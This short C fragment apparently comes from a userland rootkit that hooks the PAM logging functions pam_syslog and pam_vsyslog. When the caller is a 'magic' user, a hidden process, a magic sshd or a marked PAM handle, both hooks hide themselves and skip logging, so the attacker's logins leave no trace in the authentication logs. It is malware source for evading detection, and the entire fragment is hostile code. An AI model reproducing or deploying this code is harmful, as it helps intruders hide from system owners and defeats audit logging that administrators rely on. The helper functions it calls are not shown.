void pam_syslog(const pam_handle_t *pamh, int priority, const char *fmt, ...){
    if(magicusr() || hidden_ppid() || magicsshd() || ismagicpamh(pamh)){
        hide_self();
        return;
    }
    va_list va;
    va_start(va, fmt);
    pam_vsyslog(pamh, priority, fmt, va);
    va_end(va);
}
void pam_vsyslog(const pam_handle_t *pamh, int priority, const char *fmt, va_list args){
    if(magicusr() || hidden_ppid() || magicsshd() || ismagicpamh(pamh)){
        hide_self();
        return;
    }
    hook(CPAM_VSYSLOG);
    call(CPAM_VSYSLOG, pamh, priority, fmt, args);
}